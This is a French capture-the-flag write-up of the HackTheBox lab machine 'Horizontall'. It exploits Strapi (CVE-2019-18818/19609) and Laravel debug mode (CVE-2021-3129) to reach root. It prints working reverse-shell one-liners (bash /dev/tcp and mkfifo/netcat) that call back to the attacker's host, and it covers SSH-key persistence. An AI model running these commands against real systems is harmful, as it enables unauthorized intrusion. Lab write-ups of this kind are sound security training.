# [Horizontall] — HackTheBox

## Informations
- **Difficulté** : Easy
- **OS** : Linux
- **Date** : 15/03/2026


## Résumé
Horizontall est une machine Linux facile où seuls les services HTTP et SSH sont disponibles. L'énumération du site web révèle qu'il est basé sur le framework Vue JS. En passant en revue le code source du fichier Javascript, un nouvel hôte virtuel est découvert. Cet hôte contient le Strapi Headless CMS, lequel est vulnérable à deux CVE, autorisant de potentiels attaquants à gagner une exécution de code à distance sur le système de l'utilisateur strapi. Enfin, après énumération des services écoutant uniquement sur le localhost sur la machine à distance, une instance Laravel est découverte. Pour accéder au port que Laravel utilise, un tunnel SSH est utilisé. Le framework Laravel installé est outre-daté et est exécuté en mode debug. Une autre CVE peut être exploitée afin de gagner une exécution de code à distance au travers de Laravel en tant que root.


## Enumération
À chaque début de machine, on lance d'abord un scan nmap afin de savoir quels ports sont ouverts sur le serveur.
"nmap -Pn -sVC -p- {target_IP}"

Après le scan de la machine, on voit que les ports 22 et 80 sont ouverts.

Si on essaie de se connecter au serveur web, un proxy nous empêche de passer. Ajoutons d'abord l'addresse du serveur au dossier `/etc/hosts` :
`echo "{target-IP} {nom-de-domaine} | sudo tee -a /etc/hosts"`

Retentons, et bingo ! Une fois arrivés sur la page internet, rien de bien concluant. En fouillant un peu les connexions en cours sur le réseau, on peut apercevoir un fichier API en `.js`. Après un peu de recherche, on peut copier-coller le code dans un Javascript beautifier pour mieux séparer les lignes du script.

On tombe alors sur un nom de sous-domaine nous amenant sur le site de l'API. Ici aussi, toujours rien de bien intéressant.

On va donc utiliser `gobuster` avec l'option `dir`, nous permettant de rechercher des répertoires qu'on ne connaît pas.
Si vous n'avez pas de liste à implémenter, sur la machine virtuelle se trouve dans l'espace `/usr/share/wordlists/dirbuster` le fichier `directory-list-1.0.txt` nous donnant une liste de répertoires cachés.

Allons explorer le site web une dernière fois, et voilà ! On atterit sur une page de login.

Malheureusement, on n'a pas plus d'informations, si ce n'est que le framework utilisé est une API Strapi. Pour en obtenir la version, intercepter la page de login avec Burp Suite et dans la réponse de la requête vers `/init`, en utilisant la fonction de recherche avec le terme `strapi` ou `version`, on tombe sur la version `3.0.0-beta.17.4`.

En utilisant la commande `searchsploit strapi`, deux CVE sont reliées à cette version d'API.
De celles qui nous intéresse, le script python qui match la version exacte est le script `50239`, que l'on peut télécharger sur notre système :
`searchsploit -m 50239.py`


## Exploitation
Maintenant que nous avons notre script python, le but est de pouvoir se connecter au serveur et d'exécuter une reverse shell stable afin que la connexion ne coupe pas toutes les trente secondes.

Pour ce faire, démarrons le script avec la commande `python3 50239.py http://{url}`.

Parfait, on a bien un shell ! Le problème, c'est que c'est une blind shell. On ne pourra donc pas recevoir d'output retour.
Ouvrons une nouvelle fenêtre de terminal, et laissons écouter notre netcat :
`sudo nc -lvnp {port-de-votre-choix}`

Puis, sur la machine victime, on va venir taper la commande suivante :
`bash -c 'bash -i >& /dev/tcp/{notre-IP}/{port-netcat} 0>&1'`

Et voilà, un reverse shell ! Temps de le stabiliser.
Une petite commande python nous donnera un tty. Pour plus d'informations concernant les revshells, se référer aux ressources.

La commande pour stabiliser le shell se fait en trois étapes (toujours dans le listener netcat) :
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Effectuer un ctrl-Z pour mettre en pause le shell, puis exécuter :
`stty raw -echo; fg`
Et enfin, appuyer sur la touche Entrée deux fois.

Vous pouvez également exporter la variable d'environnement TERM pour plus de compatibilité, comme ceci :
`export TERM=xterm` ou `export TERM=xterm-256color`

La commande export TERM=xterm définit la variable d'environnement TERM, ce qui indique au système que le shell utilisé est compatible avec le terminal xterm. Cela permet aux applications (comme vim, nano, ssh) de savoir comment afficher les caractères, gérer les couleurs, les séquences d'échappement et les interactions clavier. 


## Accès initial (user flag)
Nous avons donc bien pu nous authentifier sur le serveur via l'utilisateur strapi.

Pour avoir accès à toutes les fonctions d'un terminal classique, on va créer un dossier `.ssh` ainsi qu'une clé afin de pouvoir créer une escalade de privilèges plus tard, en agissant en tant que `strapi`.

Les commandes se suivent comme ceci :
`mkdir .ssh` -> `cd .ssh` -> `ssh-keygen` -> `appuyer trois fois sur la touche Entrée`

Nous avons donc deux clés nommées `id_rsa.pub` et `id_rsa`. Copions la clé `id_rsa` sur notre système, modifions ses privilèges et connectons nous en tant que l'utilisateur strapi via notre nouveau terminal avec la commande suivante :
`ssh -i id_rsa strapi@horizontall.htb`

Et voilà, plus qu'a rechercher un peu le flag, qu'on peut retrouver dans le répertoire `/home/developer`.


## Privilege Escalation
Avec cet accès, vérifions maintenant les privilèges de l'utilisateur strapi avec la commande `sudo -l`. Pas de chance, nous n'avons pas de mot de passe pour cet utilisateur.

Vérifions tout de même les services en cours d'exécution sur le serveur local pour tenter une escalade de privilèges.
Avec la commande `ss -alnp | grep "127.0.0.1`, nous avons trois services tournant actuellement sur le serveur.

Sur le port `3306`, on retrouve le service MySQL. Ici, il n'a pas d'importance puisque nous n'avons pas de base de données à explorer.
Deux ports sont donc assez inhabituels, le port `1337` et `8000`.
Avec la commande `curl 127.0.0.1:1337`, on se retrouve face à une simple page HTML contenant un message de bienvenue.
Celui qui nous intéresse est donc celui écoutant sur le port `8000`, contenant le framework Laravel v8 sous PHP.

En utilisant un tunnel SSH, on peut aller regarder ce que contient la page à l'URL `http://localhost:8000`. Puisque nous n'avons pas plus d'informations que ça, on peut utiliser une nouvelle fois gobuster.

La commande gobuster :
`gobuster dir -u http://localhost:8000 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`

Dans les trouvailles, un des premiers répertoires est `/profiles` avec un code de réponse 500, indiquant que l'on peut s'y rendre.
Dans notre navigateur, se rendre sur la page `http://localhost:8000/profiles` nous montre que Laravel fonctionne en debug mode.

En recherchant une CVE concernant Laravel v8 tournant en debug mode, on peut trouver ce payload PoC :
`https://github.com/nth347/CVE-2021-3129_exploit.py`

Nous pouvons donc cloner cet exploit directement sur notre système grâce à la commande `git clone {URL-du-Repo}`, puis en se rendant sur le nouveau dossier, modifier les permissions d'exécution du nouvel exploit.

Dans l'usage du script, on retrouve la commande : `./exploit.py http://localhost:8000 Monolog/RCE1 id`. L'exécuter nous donne ainsi la réponse de l'utilisateur présent sur le serveur : `root`. Parfait !


## Root flag
Afin de réussir à retrouver une nouvelle fois un reverse shell, ouvrir un netcat et écrire la commande suivante :
`sudo nc -lvnp {port}`
`./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {notre-IP} {port-netcat} >/tmp/f'`

Puis la commande `id` afin de confirmer que nous sommes bien connectés en tant que root nous confirme cela.

Après un peu de recherche, la flag se trouve dans le dossier `root`.


## Pourquoi ça marche
La version de Strapi 3.0.0-beta.17.4 non mise à jour, qui est une faille connue sous les noms CVE `CVE-2019-18818` et `CVE-2019-19609` nous permettent d'obtenir un code d'exécution arbitraire à distance, nous permettant de nous connecter via l'utilisateur `strapi` sur le serveur.

La création d'une clé SSH nous permet également de prendre un peu plus le contrôle sur la machine victime, créant une nouvelle énumération système, puis de découvrir une version de Laravel fonctionnant en mode debug sur le site internet local, également connue comme une faille portant le nom `CVE-2021-3129`.

Enfin, l'exploitation des failles connues nous ont permis de nous connecter sur la machine victime avec le plus de privilèges via le compte `root`, compromettant entièrement le système.

**Kill chain :**
Strapi → 1er RCE → 1ère reverse shell → SSH-Keygen → Laravel → 2ème RCE → 2ème reverse shell → root flag


## Ressources
nmap : https://nmap.org/man/fr/index.html
Gobuster : https://manpages.ubuntu.com/manpages/focal/man1/gobuster.1.html
netcat : https://linux.die.net/man/1/nc
Shell : https://hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html
tty : https://docs.python.org/3/library/pty.html
Environnement TERM : https://linuxconfig.org/term-environment-variable-not-set-solution
SSH-Keygen: https://linux.die.net/man/1/ssh (Section "Authentication")
ss : https://www.man7.org/linux/man-pages/man8/ss.8.html